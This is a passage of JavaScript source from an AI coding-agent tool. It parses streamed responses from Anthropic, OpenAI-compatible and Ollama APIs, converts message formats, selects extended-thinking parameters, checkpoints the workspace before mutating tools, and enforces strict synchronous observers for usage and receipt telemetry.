      _ollamaReduceLine(state, buf, ui.onToken);
      await ui.settle();
    }
  } catch (err) {
    if (_streamErrorDisposition(err, signal, state.content) === "rethrow")
      throw err;
    return _finalizeTruncatedStream(_ollamaFinalize, state);
  }
  return _ollamaFinalize(state);
}

// ─── Anthropic streaming (SSE → {message, usage}, tool_use reassembled) ──────
//
// Anthropic /messages with stream:true emits SSE: message_start (input usage),
// content_block_start (text or tool_use header), content_block_delta
// (text_delta → onToken, or input_json_delta accumulating a tool's JSON args),
// message_delta (output usage). We reduce per `data:` line and finalize into
// the same shape chatWithTools returns non-streamed.

function _anthropicInitState() {
  return {
    text: "",
    blocks: {},
    inputTokens: null,
    outputTokens: null,
    cacheReadTokens: 0,
    cacheCreationTokens: 0,
    usageInvalid: false,
  };
}

function _anthropicReduceLine(state, raw, onToken, onThinking) {
  const line = (raw || "").trim();
  if (!line.startsWith("data:")) return state;
  const payload = line.slice(5).trim();
  if (!payload) return state;
  let obj;
  try {
    obj = JSON.parse(payload);
  } catch {
    return state;
  }
  if (obj.type === "message_start") {
    const usage = obj.message?.usage;
    if (usage != null) {
      const inputTokens = _providerUsageCount(
        usage,
        "input_tokens",
        "prompt_tokens",
      );
      const cacheReadTokens = _optionalProviderUsageCount(
        usage,
        "cache_read_input_tokens",
        "cache_read_tokens",
      );
      const cacheCreationTokens = _optionalProviderUsageCount(
        usage,
        "cache_creation_input_tokens",
        "cache_creation_tokens",
      );
      if (
        inputTokens == null ||
        cacheReadTokens == null ||
        cacheCreationTokens == null
      ) {
        state.usageInvalid = true;
      } else {
        state.inputTokens = inputTokens;
        state.cacheReadTokens = cacheReadTokens;
        state.cacheCreationTokens = cacheCreationTokens;
      }
    }
  } else if (obj.type === "content_block_start") {
    const cb = obj.content_block || {};
    state.blocks[obj.index] =
      cb.type === "tool_use"
        ? { type: "tool_use", id: cb.id, name: cb.name, json: "" }
        : cb.type === "thinking"
          ? { type: "thinking", thinking: "", signature: "" }
          : cb.type === "redacted_thinking"
            ? { type: "redacted_thinking", data: cb.data || "" }
            : { type: "text" };
  } else if (obj.type === "content_block_delta") {
    const d = obj.delta || {};
    if (d.type === "text_delta" && d.text) {
      state.text += d.text;
      if (typeof onToken === "function") {
        try {
          onToken(d.text);
        } catch {
          // a failing UI hook must never break the run
        }
      }
    } else if (d.type === "input_json_delta" && state.blocks[obj.index]) {
      state.blocks[obj.index].json += d.partial_json || "";
    } else if (d.type === "thinking_delta" && state.blocks[obj.index]) {
      state.blocks[obj.index].thinking =
        (state.blocks[obj.index].thinking || "") + (d.thinking || "");
      if (typeof onThinking === "function" && d.thinking) {
        try {
          onThinking(d.thinking);
        } catch {
          // a failing UI hook must never break the run
        }
      }
    } else if (d.type === "signature_delta" && state.blocks[obj.index]) {
      state.blocks[obj.index].signature =
        (state.blocks[obj.index].signature || "") + (d.signature || "");
    }
  } else if (obj.type === "message_delta") {
    if (obj.usage != null) {
      const outputTokens = _providerUsageCount(
        obj.usage,
        "output_tokens",
        "completion_tokens",
      );
      if (outputTokens == null) {
        state.usageInvalid = true;
      } else {
        state.outputTokens = outputTokens;
      }
    }
  }
  return state;
}

function _anthropicFinalize(state) {
  const toolCalls = [];
  const thinkingBlocks = [];
  for (const k of Object.keys(state.blocks).sort(
    (a, b) => Number(a) - Number(b),
  )) {
    const b = state.blocks[k];
    if (b.type === "tool_use") {
      let input = {};
      try {
        input = b.json ? JSON.parse(b.json) : {};
      } catch {
        input = {};
      }
      toolCalls.push({
        id: b.id,
        type: "function",
        function: { name: b.name, arguments: JSON.stringify(input) },
      });
    } else if (b.type === "thinking") {
      thinkingBlocks.push({
        type: "thinking",
        thinking: b.thinking || "",
        signature: b.signature || "",
      });
    } else if (b.type === "redacted_thinking") {
      thinkingBlocks.push({ type: "redacted_thinking", data: b.data || "" });
    }
  }
  const message = { role: "assistant", content: state.text };
  if (toolCalls.length) message.tool_calls = toolCalls;
  // Preserve thinking blocks verbatim (incl. signature) for replay on the next
  // tool turn — required by the API when extended thinking is on.
  if (thinkingBlocks.length) message._thinkingBlocks = thinkingBlocks;
  const out = { message };
  if (
    state.usageInvalid !== true &&
    _isNonNegativeSafeInteger(state.inputTokens) &&
    _isNonNegativeSafeInteger(state.outputTokens)
  ) {
    out.usage = {
      input_tokens: state.inputTokens,
      output_tokens: state.outputTokens,
      cache_read_input_tokens: state.cacheReadTokens,
      cache_creation_input_tokens: state.cacheCreationTokens,
    };
  }
  return out;
}

/** Pure reducer over Anthropic SSE lines — exported for tests (no HTTP). */
export function _accumulateAnthropicStream(lines, onToken, onThinking) {
  const state = _anthropicInitState();
  for (const line of lines)
    _anthropicReduceLine(state, line, onToken, onThinking);
  return _anthropicFinalize(state);
}

async function _chatAnthropicStreaming(
  apiUrl,
  body,
  extraHeaders,
  onToken,
  signal,
  onThinking,
  onStall,
  stallMs,
  stallTimeoutMs,
) {
  const response = await fetch(apiUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json", ...extraHeaders },
    signal,
    body: JSON.stringify(body),
  });
  if (!response.ok) {
    throw new Error(await formatProviderResponseError("anthropic", response));
  }
  const state = _anthropicInitState();
  const ui = _streamUiCallbacks(onToken, onThinking);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let buf = "";
  try {
    for await (const value of _iterateStreamWithStall(reader, {
      onStall,
      stallMs,
      stallTimeoutMs,
    })) {
      buf += decoder.decode(value, { stream: true });
      const lines = buf.split("\n");
      buf = lines.pop() || "";
      for (const line of lines) {
        _anthropicReduceLine(state, line, ui.onToken, ui.onThinking);
        await ui.settle();
      }
    }
    if (buf.trim()) {
      _anthropicReduceLine(state, buf, ui.onToken, ui.onThinking);
      await ui.settle();
    }
  } catch (err) {
    if (_streamErrorDisposition(err, signal, state.text) === "rethrow")
      throw err;
    return _finalizeTruncatedStream(_anthropicFinalize, state);
  }
  return _anthropicFinalize(state);
}

// ─── OpenAI-compatible streaming (SSE → {message, usage}) ────────────────────
//
// `data:` lines carry choices[0].delta.{content, tool_calls[]}; tool_calls
// arrive fragmented and keyed by `index` (name in the first chunk, arguments
// concatenated across chunks). usage rides the terminal chunk when
// stream_options.include_usage was requested. Terminator: `data: [DONE]`.

// OpenAI-compatible cached-prompt-token count. OpenAI / volcengine report it as
// usage.prompt_tokens_details.cached_tokens; DeepSeek as
// usage.prompt_cache_hit_tokens. In BOTH, prompt_tokens already INCLUDES the
// cached count (unlike Anthropic, where input_tokens is the uncached remainder)
// — so callers subtract it to recover the uncached input and avoid pricing the
// cached prefix twice. Verified live against volcengine (field present, 0 when
// the provider does not auto-cache).
function _openaiCachedTokens(usage) {
  if (!usage || typeof usage !== "object" || Array.isArray(usage)) return null;
  const candidates = [];
  const hasDirect =
    Object.prototype.hasOwnProperty.call(usage, "cache_read_input_tokens") ||
    Object.prototype.hasOwnProperty.call(usage, "cache_read_tokens");
  if (hasDirect) {
    const direct = _optionalProviderUsageCount(
      usage,
      "cache_read_input_tokens",
      "cache_read_tokens",
    );
    if (direct == null) return null;
    candidates.push(direct);
  }

  if (Object.prototype.hasOwnProperty.call(usage, "prompt_tokens_details")) {
    const details = usage.prompt_tokens_details;
    if (!details || typeof details !== "object" || Array.isArray(details)) {
      return null;
    }
    if (Object.prototype.hasOwnProperty.call(details, "cached_tokens")) {
      if (!_isNonNegativeSafeInteger(details.cached_tokens)) return null;
      candidates.push(details.cached_tokens);
    }
  }

  if (Object.prototype.hasOwnProperty.call(usage, "prompt_cache_hit_tokens")) {
    if (!_isNonNegativeSafeInteger(usage.prompt_cache_hit_tokens)) return null;
    candidates.push(usage.prompt_cache_hit_tokens);
  }

  if (candidates.some((value) => value !== candidates[0])) return null;
  return candidates[0] ?? 0;
}

function _openaiInitState() {
  return {
    responseId: null,
    text: "",
    tools: [],
    inputTokens: null,
    outputTokens: null,
    cacheReadTokens: 0,
    usageInvalid: false,
  };
}

function _openaiReduceLine(state, raw, onToken) {
  const line = (raw || "").trim();
  if (!line.startsWith("data:")) return state;
  const payload = line.slice(5).trim();
  if (!payload || payload === "[DONE]") return state;
  let obj;
  try {
    obj = JSON.parse(payload);
  } catch {
    return state;
  }
  if (!state.responseId) state.responseId = _providerReceiptId(obj.id);
  const delta = obj.choices?.[0]?.delta;
  if (delta?.content) {
    state.text += delta.content;
    if (typeof onToken === "function") {
      try {
        onToken(delta.content);
      } catch {
        // a failing UI hook must never break the run
      }
    }
  }
  if (Array.isArray(delta?.tool_calls)) {
    for (const tc of delta.tool_calls) {
      const idx = tc.index ?? 0;
      if (!state.tools[idx])
        state.tools[idx] = { id: undefined, name: "", args: "" };
      if (tc.id) state.tools[idx].id = tc.id;
      if (tc.function?.name) state.tools[idx].name = tc.function.name;
      if (tc.function?.arguments)
        state.tools[idx].args += tc.function.arguments;
    }
  }
  if (obj.usage != null) {
    const usage = obj.usage;
    const prompt = _providerUsageCount(usage, "input_tokens", "prompt_tokens");
    const completion = _providerUsageCount(
      usage,
      "output_tokens",
      "completion_tokens",
    );
    const cached = _openaiCachedTokens(obj.usage);
    if (
      !_hasCompleteProviderUsage(usage) ||
      cached == null ||
      cached > prompt
    ) {
      state.usageInvalid = true;
    } else {
      state.inputTokens = Math.max(0, prompt - cached);
      state.outputTokens = completion;
      state.cacheReadTokens = cached;
    }
  }
  return state;
}

function _openaiFinalize(state) {
  const toolCalls = state.tools.filter(Boolean).map((t) => ({
    id: t.id || `call_${t.name || "tool"}`,
    type: "function",
    function: { name: t.name, arguments: t.args || "{}" },
  }));
  const message = { role: "assistant", content: state.text };
  if (toolCalls.length) message.tool_calls = toolCalls;
  const out = { message };
  if (
    state.usageInvalid !== true &&
    _isNonNegativeSafeInteger(state.inputTokens) &&
    _isNonNegativeSafeInteger(state.outputTokens)
  ) {
    out.usage = {
      input_tokens: state.inputTokens,
      output_tokens: state.outputTokens,
      cache_read_input_tokens: state.cacheReadTokens,
    };
  }
  return out;
}

/** Pure reducer over OpenAI-compatible SSE lines — exported for tests. */
export function _accumulateOpenAIStream(lines, onToken) {
  const state = _openaiInitState();
  for (const line of lines) _openaiReduceLine(state, line, onToken);
  return _openaiFinalize(state);
}

async function _chatOpenAIStreaming(
  apiUrl,
  body,
  apiKey,
  onToken,
  signal,
  provider,
  onStall,
  stallMs,
  stallTimeoutMs,
  providerRequestId = null,
) {
  const response = await fetch(apiUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${apiKey}`,
      ...(providerRequestId
        ? { "X-Client-Request-Id": providerRequestId }
        : {}),
    },
    signal,
    body: JSON.stringify(body),
  });
  if (!response.ok) {
    throw new Error(await formatProviderResponseError(provider, response));
  }
  const state = _openaiInitState();
  const ui = _streamUiCallbacks(onToken);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let buf = "";
  try {
    for await (const value of _iterateStreamWithStall(reader, {
      onStall,
      stallMs,
      stallTimeoutMs,
    })) {
      buf += decoder.decode(value, { stream: true });
      const lines = buf.split("\n");
      buf = lines.pop() || "";
      for (const line of lines) {
        _openaiReduceLine(state, line, ui.onToken);
        await ui.settle();
      }
    }
    if (buf.trim()) {
      _openaiReduceLine(state, buf, ui.onToken);
      await ui.settle();
    }
  } catch (err) {
    if (_streamErrorDisposition(err, signal, state.text) === "rethrow")
      throw err;
    const out = _finalizeTruncatedStream(_openaiFinalize, state);
    const providerReceipt = _openAIProviderRequestReceipt(
      response,
      { id: state.responseId },
      providerRequestId,
    );
    if (providerReceipt) out.providerReceipt = providerReceipt;
    return out;
  }
  const out = _openaiFinalize(state);
  const providerReceipt = _openAIProviderRequestReceipt(
    response,
    { id: state.responseId },
    providerRequestId,
  );
  if (providerReceipt) out.providerReceipt = providerReceipt;
  return out;
}

/**
 * Convert cc's internal OpenAI-shaped messages into Anthropic content-block
 * messages. Internal shape: {role:"user"|"assistant"|"tool", content,
 * tool_calls?, _thinkingBlocks?}. Anthropic shape: {role:"user"|"assistant",
 * content: string | block[]} — assistant tool calls become {type:"tool_use"}
 * blocks; tool results become {type:"tool_result"} blocks inside a USER turn,
 * with consecutive results merged. Preserved thinking blocks (with signature)
 * are replayed FIRST in the assistant turn (the API requires them ahead of
 * tool_use when continuing a thinking+tool turn). Exported for tests.
 */
export function _toAnthropicMessages(msgs) {
  const out = [];
  let pendingResults = [];
  const flush = () => {
    if (pendingResults.length) {
      out.push({ role: "user", content: pendingResults });
      pendingResults = [];
    }
  };
  for (const m of msgs || []) {
    if (!m) continue;
    if (m.role === "tool") {
      pendingResults.push({
        type: "tool_result",
        tool_use_id: m.tool_call_id,
        content:
          typeof m.content === "string"
            ? m.content
            : JSON.stringify(m.content ?? ""),
      });
      continue;
    }
    flush();
    if (m.role === "assistant") {
      const blocks = [];
      if (Array.isArray(m._thinkingBlocks)) {
        for (const tb of m._thinkingBlocks) blocks.push(tb);
      }
      if (typeof m.content === "string" && m.content.trim()) {
        blocks.push({ type: "text", text: m.content });
      } else if (Array.isArray(m.content)) {
        for (const b of m.content) blocks.push(b);
      }
      if (Array.isArray(m.tool_calls)) {
        for (const tc of m.tool_calls) {
          const raw = tc.function?.arguments;
          let input = {};
          try {
            input =
              typeof raw === "string" ? JSON.parse(raw || "{}") : raw || {};
          } catch {
            input = {};
          }
          blocks.push({
            type: "tool_use",
            id: tc.id,
            name: tc.function?.name,
            input,
          });
        }
      }
      out.push({
        role: "assistant",
        content: blocks.length ? blocks : m.content || "",
      });
    } else {
      // user turn: pass content through (string or already-block array). When
      // it carries OpenAI-style `image_url` parts (`cc agent --image`), convert
      // them to Anthropic `image` blocks; text parts and any other blocks pass
      // through unchanged.
      let content = m.content;
      if (Array.isArray(content)) {
        content = content.map((b) =>
          b?.type === "image_url" ? imageUrlBlockToAnthropic(b) || b : b,
        );
      }
      out.push({ role: "user", content });
    }
  }
  flush();
  return out;
}

/** Map a Claude-Code-style intensity to an Anthropic effort level. */
function _intensityToEffort(want) {
  switch (String(want)) {
    case "ultra":
    case "ultrathink":
      return "xhigh";
    case "hard":
    case "think-hard":
    case "harder":
      return "high";
    case "think":
      return "medium";
    default:
      return "high"; // bare `true` → a sensible default for intelligence work
  }
}

/**
 * Decide the Anthropic `thinking` request params for a model. Returns null
 * (off) unless the caller opts in via options.thinking (true | "think" |
 * "hard" | "ultra"). Model-aware per the Claude API:
 *   - Opus 4.6/4.7/4.8, Sonnet 4.6 → adaptive thinking + output_config.effort
 *   - Sonnet 4.5 / Opus 4.0-4.5 / older → legacy enabled+budget (< max_tokens)
 *   - anything else (e.g. Haiku) → null (no thinking)
 * temperature is never added (it 400s on Opus 4.7/4.8). Note: `xhigh`/`max`
 * effort are Opus-tier — on Sonnet they may error; left to the caller's intent.
 * RUNTIME-UNVERIFIED — no Anthropic key to validate the wire shape live.
 * Exported for tests.
 */
export function _anthropicThinkingParams(
  model,
  options = {},
  maxTokens = 8192,
) {
  const want = options?.thinking;
  if (!want) return null; // off by default → request unchanged
  const m = String(model || "").toLowerCase();
  const adaptive = /opus-4-(6|7|8)/.test(m) || /sonnet-4-6/.test(m);
  const legacy =
    /sonnet-4-5/.test(m) ||
    /opus-4-(0|1|5)/.test(m) ||
    /sonnet-4-0/.test(m) ||
    /sonnet-3/.test(m) ||
    /opus-3/.test(m);
  if (adaptive) {
    const params = { thinking: { type: "adaptive" } };
    const effort =
      typeof options.thinkingEffort === "string"
        ? options.thinkingEffort
        : _intensityToEffort(want);
    if (effort) params.output_config = { effort };
    return params;
  }
  if (legacy) {
    let budget = Number(options.thinkingBudget) || 8000;
    // budget_tokens must be strictly < max_tokens (min 1024) on legacy models
    if (budget >= maxTokens) budget = Math.max(1024, Math.floor(maxTokens / 2));
    return { thinking: { type: "enabled", budget_tokens: budget } };
  }
  return null; // unknown / Haiku → no thinking
}

export function _normalizeAnthropicResponse(data) {
  const content = data.content || [];
  const textBlocks = content.filter((b) => b.type === "text");
  const toolBlocks = content.filter((b) => b.type === "tool_use");
  const thinkingBlocks = content.filter(
    (b) => b.type === "thinking" || b.type === "redacted_thinking",
  );

  const message = {
    role: "assistant",
    content: textBlocks.map((b) => b.text).join("\n") || "",
  };

  if (toolBlocks.length > 0) {
    message.tool_calls = toolBlocks.map((b) => ({
      id: b.id,
      type: "function",
      function: {
        name: b.name,
        arguments: JSON.stringify(b.input),
      },
    }));
  }

  // Preserve thinking blocks VERBATIM (incl. signature) so the agent loop can
  // replay them on the next tool turn — required when extended thinking is on,
  // harmless (absent) otherwise. _toAnthropicMessages re-emits them first.
  if (thinkingBlocks.length > 0) {
    message._thinkingBlocks = thinkingBlocks;
  }

  return { message };
}

// ─── Agent loop (async generator) ─────────────────────────────────────────

// Tools that never mutate the workspace — auto-checkpoint skips these.
const _CHECKPOINT_READ_ONLY = new Set([
  "read_file",
  "search_files",
  "code_intelligence",
  "list_dir",
  "list_skills",
  "search_sessions",
]);

// Rolling cap on auto-checkpoints per agent session — the engine prunes the
// oldest beyond this so a long run can't accumulate unbounded refs.
const MAX_AUTO_CHECKPOINTS_PER_SESSION = 100;

let _checkpointStoreP = null;
function _loadCheckpointStore() {
  if (!_checkpointStoreP) {
    _checkpointStoreP = import("../lib/checkpoint-store.js");
  }
  return _checkpointStoreP;
}

/**
 * Best-effort auto-checkpoint of the working tree BEFORE a mutating tool runs,
 * so a later `cc checkpoint restore` can roll back to just before that tool.
 * Enabled via toolContext.autoCheckpoint; uses the git engine only (no-op
 * outside a git work tree). Never throws — checkpointing must not block a tool.
 *
 * @returns {Promise<string|null>} the checkpoint id, or null when skipped
 */
async function _autoCheckpointBeforeTool(toolContext, toolName, toolArgs) {
  if (!toolContext?.autoCheckpoint) return null;
  if (_CHECKPOINT_READ_ONLY.has(toolName)) return null;
  const cwd = toolContext.cwd || process.cwd();
  try {
    const store = await _loadCheckpointStore();
    if (!store.isCheckpointAvailable(cwd)) return null;
    const res = store.createCheckpoint(cwd, {
      session: toolContext.checkpointSession || "agent",
      label: `before ${toolName}: ${formatToolArgs(toolName, toolArgs)}`.slice(
        0,
        120,
      ),
      skipIfUnchanged: true,
      // Bound auto-checkpoint history: a rolling safety net of the last N
      // mutating-tool states. Prevents unbounded ref growth + O(n²) nextId over
      // a long agentic run (rewinding 100+ tool calls back is already extreme).
      maxPerSession: MAX_AUTO_CHECKPOINTS_PER_SESSION,
    });
    return res?.id || null;
  } catch {
    return null; // checkpoint failure must never block the tool
  }
}

function _managedCheckpointUncoveredWriterReason(toolContext) {
  if (
    Array.isArray(toolContext?.additionalDirectories) &&
    toolContext.additionalDirectories.length > 0
  ) {
    return "additional_workspace_roots_not_transactional";
  }
  if (
    toolContext?.mcpClient?.servers instanceof Map &&
    toolContext.mcpClient.servers.size > 0
  ) {
    return "ambient_mcp_server_writer_not_quiescent";
  }
  const workspaceRoot = path.resolve(toolContext?.cwd || process.cwd());
  const hasOverlappingCodeIntel = [..._codeIntelPool.keys()].some(
    (candidate) => {
      const lspRoot = path.resolve(candidate);
      const workspaceToLsp = path.relative(workspaceRoot, lspRoot);
      const lspToWorkspace = path.relative(lspRoot, workspaceRoot);
      const isInside = (relative) =>
        relative === "" ||
        (relative !== ".." &&
          !relative.startsWith(`..${path.sep}`) &&
          !path.isAbsolute(relative));
      return isInside(workspaceToLsp) || isInside(lspToWorkspace);
    },
  );
  if (hasOverlappingCodeIntel) {
    return "ambient_lsp_writer_not_quiescent";
  }
  if (
    [..._backgroundShellTasks.values()].some(
      (task) => task?.status === "running",
    )
  ) {
    return "ambient_background_shell_writer_not_quiescent";
  }
  if (
    toolContext?.backgroundSubAgents instanceof Map &&
    toolContext.backgroundSubAgents.size > 0
  ) {
    return "ambient_background_agent_writer_not_quiescent";
  }
  if (toolContext?.hookSupervisor && toolContext?.settingsHooks) {
    return "asynchronous_hook_writer_not_quiescent";
  }
  return null;
}

/**
 * Async generator that drives the agentic tool-use loop.
 *
 * Yields events:
 *   { type: "slot-filling", slot, question }  — when asking user for missing info
 *   { type: "checkpoint", id, tool }          — auto-checkpoint before a mutating tool
 *   { type: "tool-executing", tool, args }
 *   { type: "tool-result", tool, result, error }
 *   { type: "model-usage-started", callId, provider, model, source }
 *   { type: "provider-request-receipt", source, workflowEffectId, clientRequestId, requestId, responseId }
 *   { type: "token-usage", callId, provider, model, usage, source? }
 *   { type: "model-usage-unknown", callId, provider, model, source, code }
 *   { type: "response-complete", content }
 *
 * @param {Array} messages - mutable messages array (will be appended to)
 * @param {object} options - provider, model, baseUrl, apiKey, contextEngine, hookDb, skillLoader, cwd, slotFiller, interaction
 */
const _autoCompactionUsageStates = new WeakMap();
const _autoCompactorInstrumentation = new WeakMap();

function _newModelUsageCallId(source = "model") {
  // UUIDs are generated locally and contain no session/run/user material. The
  // fixed prefixes keep the identifier useful in diagnostics while remaining
  // far below the persisted ledger's 128-character ceiling.
  const prefix =
    source === "semantic-compaction"
      ? "cmp"
      : source === "subagent"
        ? "sub"
        : "mdl";
  return `${prefix}-${randomUUID()}`;
}

const WORKFLOW_EFFECT_ID_RE = /^sha256:[a-f0-9]{64}$/;
const WORKFLOW_CHILD_EFFECT_PROTOCOL = "cc-workflow-child-effect/v1";
const WORKFLOW_TOOL_CALL_ID_RE = /^[\x21-\x7e]{1,512}$/;

function _normalizeWorkflowEffectId(value) {
  if (value == null) return null;
  if (typeof value !== "string" || !WORKFLOW_EFFECT_ID_RE.test(value)) {
    throw new TypeError("workflowEffectId must be a canonical sha256 identity");
  }
  return value;
}

function _workflowProviderRequestId(workflowEffectId, source, sequence) {
  if (!workflowEffectId) return null;
  return `ccwf_${createHash("sha256")
    .update(
      `${workflowEffectId}\0${String(source || "model")}\0${String(sequence)}`,
      "utf8",
    )
    .digest("hex")}`;
}

function _workflowToolEffectBinding(
  workflowEffectId,
  sequence,
  toolCallId,
  toolName,
) {
  if (!workflowEffectId) return null;
  if (
    !Number.isSafeInteger(sequence) ||
    sequence < 1 ||
    typeof toolCallId !== "string" ||
    !WORKFLOW_TOOL_CALL_ID_RE.test(toolCallId) ||
    typeof toolName !== "string" ||
    !toolName
  ) {
    const error = new TypeError(
      "workflow-bound tool call identity is malformed",
    );
    error.code = "CC_WORKFLOW_CHILD_EFFECT_IDENTITY_INVALID";
    throw error;
  }
  const childEffectId = `sha256:${createHash("sha256")
    .update(
      `${workflowEffectId}\0tool\0${String(sequence)}\0${toolCallId}\0${toolName}`,
      "utf8",
    )
    .digest("hex")}`;
  return Object.freeze({
    workflowEffectProtocol: WORKFLOW_CHILD_EFFECT_PROTOCOL,
    workflowEffectId,
    workflowChildEffectId: childEffectId,
    workflowChildSequence: sequence,
  });
}

function _workflowNestedToolOutcomeUnknown(binding, toolName, result) {
  if (!binding || safeMcpProperty(result, "outcomeUnknown") !== true) {
    return null;
  }
  const error = new Error(
    `Workflow-bound nested tool ${toolName} has an unknown outcome and requires reconciliation`,
  );
  error.code = "CC_WORKFLOW_NESTED_TOOL_OUTCOME_UNKNOWN";
  error.workflowEffectOutcomeUnknown = true;
  error.workflowEffectId = binding.workflowEffectId;
  error.workflowChildEffectId = binding.workflowChildEffectId;
  return error;
}

function _workflowCompactionOutcomeUnknown(
  cause,
  code = "CC_WORKFLOW_COMPACTION_PROVIDER_OUTCOME_UNKNOWN",
  message = "Workflow-bound semantic compaction provider outcome is unknown",
) {
  const error = new Error(message, cause ? { cause } : undefined);
  error.code = code;
  error.workflowEffectOutcomeUnknown = true;
  error.compactionFailureReported = false;
  return error;
}

function _markWorkflowCompactionFailureReported(error) {
  if (error?.workflowEffectOutcomeUnknown === true) {
    error.compactionFailureReported = true;
  }
  return error;
}

function _snapshotProviderRequestReceipt(
  value,
  expectedClientRequestId,
  expectedProvider,
) {
  if (value == null) return null;
  if (isProxy(value)) {
    throw new TypeError("provider request receipt must not be a Proxy");
  }
  const descriptors = Object.getOwnPropertyDescriptors(value);
  const expectedFields = [
    "clientRequestId",
    "independentlyReadable",
    "protocol",
    "provider",
    "requestId",
    "requestIdentitySemantics",
    "responseId",
  ];
  const fields = Object.keys(descriptors).sort();
  const hasOnlyDataFields =
    fields.length === expectedFields.length &&
    fields.every(
      (field, index) =>
        field === expectedFields[index] &&
        Object.hasOwn(descriptors[field], "value") &&
        descriptors[field].enumerable === true,
    );
  if (
    !value ||
    typeof value !== "object" ||
    Array.isArray(value) ||
    !hasOnlyDataFields ||
    descriptors.protocol.value !== "cc-provider-request-receipt/v1" ||
    !/^[a-z0-9][a-z0-9._-]{0,63}$/.test(descriptors.provider.value || "") ||
    descriptors.provider.value !== expectedProvider ||
    descriptors.clientRequestId.value !== expectedClientRequestId ||
    descriptors.requestIdentitySemantics.value !== "trace-only" ||
    descriptors.independentlyReadable.value !== false
  ) {
    throw new TypeError("provider request receipt is malformed");
  }
  const requestId = _providerReceiptId(descriptors.requestId.value);
  const responseId = _providerReceiptId(descriptors.responseId.value);
  if (!requestId && !responseId) {
    throw new TypeError("provider request receipt has no provider identifier");
  }
  return Object.freeze({
    protocol: "cc-provider-request-receipt/v1",
    provider: descriptors.provider.value,
    clientRequestId: expectedClientRequestId,
    requestId,
    responseId,
    requestIdentitySemantics: "trace-only",
    independentlyReadable: false,
  });
}

function _runtimeUsageBoundaryFailure(error, code, fallbackMessage) {
  const failure =
    error && (typeof error === "object" || typeof error === "function")
      ? error
      : new Error(fallbackMessage);
  try {
    failure.runtimeLedgerPersistence = true;
    if (!failure.code && code) failure.code = code;
  } catch {
    const wrapped = new Error(fallbackMessage, { cause: error });
    wrapped.runtimeLedgerPersistence = true;
    wrapped.code = code;
    return wrapped;
  }
  return failure;
}

/**
 * Strict child loops are consumed inside executeTool, so their yielded model
 * boundaries cannot reach the parent host before provider work. Require the
 * parent's synchronous persistence observer and prewrite one conservative
 * subagent call. The matching unknown event is forwarded after child settlement.
 */
function _notifyStrictUsageBoundary(observer, boundary) {
  if (typeof observer !== "function") {
    throw _runtimeUsageBoundaryFailure(
      null,
      "CC_USAGE_BOUNDARY_OBSERVER_REQUIRED",
      "Strict child usage telemetry requires a synchronous boundary observer",
    );
  }
  let observation;
  try {
    observation = observer(boundary);
  } catch (error) {
    throw _runtimeUsageBoundaryFailure(
      error,
      "CC_USAGE_BOUNDARY_PERSISTENCE_FAILED",
      "Child usage boundary persistence failed",
    );
  }
  let isThenable = false;
  try {
    isThenable = Boolean(observation && typeof observation.then === "function");
  } catch (error) {
    throw _runtimeUsageBoundaryFailure(
      error,
      "CC_USAGE_BOUNDARY_OBSERVER_ASYNC",
      "Child usage boundary observer must be synchronous",
    );
  }
  if (isThenable) {
    void Promise.resolve(observation).catch(() => {});
    throw _runtimeUsageBoundaryFailure(
      null,
      "CC_USAGE_BOUNDARY_OBSERVER_ASYNC",
      "Child usage boundary observer must be synchronous",
    );
  }
}

function _notifyStrictUsageSettlement(observer, settlement) {
  if (typeof observer !== "function") {
    throw _runtimeUsageBoundaryFailure(
      null,
      "CC_USAGE_SETTLEMENT_OBSERVER_REQUIRED",
      "Strict child usage telemetry requires a synchronous settlement observer",
    );
  }
  let observation;
  try {
    observation = observer(settlement);
  } catch (error) {
    throw _runtimeUsageBoundaryFailure(
      error,
      "CC_USAGE_SETTLEMENT_PERSISTENCE_FAILED",
      "Child usage settlement persistence failed",
    );
  }
  let isThenable = false;
  try {
    isThenable = Boolean(observation && typeof observation.then === "function");
  } catch (error) {
    throw _runtimeUsageBoundaryFailure(
      error,
      "CC_USAGE_SETTLEMENT_OBSERVER_ASYNC",
      "Child usage settlement observer must be synchronous",
    );
  }
  if (isThenable) {
    void Promise.resolve(observation).catch(() => {});
    throw _runtimeUsageBoundaryFailure(
      null,
      "CC_USAGE_SETTLEMENT_OBSERVER_ASYNC",
      "Child usage settlement observer must be synchronous",
    );
  }
}

function _notifyStrictProviderReceipt(observer, receipt) {
  if (typeof observer !== "function") return;
  let observation;
  try {
    observation = observer(receipt);
  } catch (error) {
    throw _runtimeUsageBoundaryFailure(
      error,
      "CC_USAGE_RECEIPT_PERSISTENCE_FAILED",
      "Child provider receipt persistence failed",
    );
  }
  let isThenable = false;
  try {
    isThenable = Boolean(observation && typeof observation.then === "function");
  } catch (error) {
    throw _runtimeUsageBoundaryFailure(
      error,
      "CC_USAGE_RECEIPT_OBSERVER_ASYNC",
      "Child provider receipt observer must be synchronous",
    );
  }
  if (isThenable) {
    void Promise.resolve(observation).catch(() => {});
    throw _runtimeUsageBoundaryFailure(
      null,
      "CC_USAGE_RECEIPT_OBSERVER_ASYNC",
      "Child provider receipt observer must be synchronous",
    );
  }
}

function _notifyStrictToolObserver(observer, event, phase) {
  const upper = phase.toUpperCase();
  if (typeof observer !== "function") {
    throw _runtimeUsageBoundaryFailure(
      null,
      `CC_TOOL_${upper}_OBSERVER_REQUIRED`,
      `Strict child tool ${phase} requires a synchronous persistence observer`,
    );
  }
  let observation;
  try {
    observation = observer(event);
  } catch (error) {
    throw _runtimeUsageBoundaryFailure(
      error,
      `CC_TOOL_${upper}_PERSISTENCE_FAILED`,
      `Child tool ${phase} persistence failed`,
    );
  }
  if (observation && typeof observation.then === "function") {
    void Promise.resolve(observation).catch(() => {});
    throw _runtimeUsageBoundaryFailure(
      null,
      `CC_TOOL_${upper}_OBSERVER_ASYNC`,
      `Child tool ${phase} observer must be synchronous`,
    );
  }
}

function _notifyStrictRetryObserver(observer, args) {
  if (typeof observer !== "function") {
    throw _runtimeUsageBoundaryFailure(
      null,
      "CC_RETRY_OBSERVER_REQUIRED",
      "Strict child streaming retry requires a synchronous persistence observer",
    );
  }
  let observation;
  try {
    observation = observer(...args);
  } catch (error) {
    throw _runtimeUsageBoundaryFailure(
      error,
      "CC_RETRY_PERSISTENCE_FAILED",
      "Child streaming retry persistence failed",
    );
  }
  if (observation && typeof observation.then === "function") {
    void Promise.resolve(observation).catch(() => {});
    throw _runtimeUsageBoundaryFailure(
      null,
